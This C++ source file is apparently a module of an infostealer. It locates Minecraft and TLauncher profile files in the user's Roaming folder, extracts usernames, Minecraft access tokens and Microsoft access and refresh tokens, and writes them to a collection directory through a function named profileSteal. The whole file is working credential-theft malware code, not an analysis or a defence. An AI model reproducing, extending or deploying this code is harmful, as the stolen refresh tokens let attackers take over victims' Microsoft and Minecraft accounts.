//
// Created by .1qxz on 11.06.2024.
//

#include "Minecraft.h"

static const std::vector<fs::path> PROFILES_PATHS = {
        Utils::getRoamingPath() / ".minecraft" / "launcher_profiles.json",
        Utils::getRoamingPath() / ".minecraft" / "tlauncher_profiles.json",
        Utils::getRoamingPath() / ".tlauncher" / "legacy" / "Minecraft" / "game" / "tlauncher_profiles.json",
};

void Minecraft::execute(fs::path &root) {
    for(const fs::path &profile : PROFILES_PATHS)
    {
        Minecraft::profileSteal(root / "Minecraft", profile);
    }
}

void Minecraft::profileSteal(const fs::path &root, const fs::path &profile_path) {
    if(!exists(profile_path))
        return;

    json j = json::parse(Utils::readFile(profile_path));
    std::list<std::unique_ptr<Entity>> accounts;

    auto users = j["userSet"]["list"];

    for (const auto& user : users) {
        if (user.contains("name") && user.contains("minecraft") && user.contains("microsoft")) {
            std::string name = user["name"];
            std::string minecraft_token = user["minecraft"]["token"];
            std::string minecraft_expiresAt = user["minecraft"]["expiresAt"];
            std::string microsoft_accessToken = user["microsoft"]["accessToken"];
            std::string microsoft_refreshToken = user["microsoft"]["refreshToken"];
            std::string microsoft_expiresAt = user["microsoft"]["expiresAt"];

            auto account = std::make_unique<MinecraftAccount>();
            account->username = name;

            MinecraftToken minecraftToken;
            minecraftToken.accessToken = minecraft_token;
            minecraftToken.expiresAt = minecraft_expiresAt;

            MicrosoftToken microsoftToken;
            microsoftToken.accessToken = microsoft_accessToken;
            microsoftToken.refreshToken = microsoft_refreshToken;
            microsoftToken.expiresAt = microsoft_expiresAt;

            account->minecraftToken = minecraftToken;
            account->microsoftToken = microsoftToken;

            accounts.push_back(std::move(account));
        }
    }

    Entity::writeSelf(root, accounts);
}
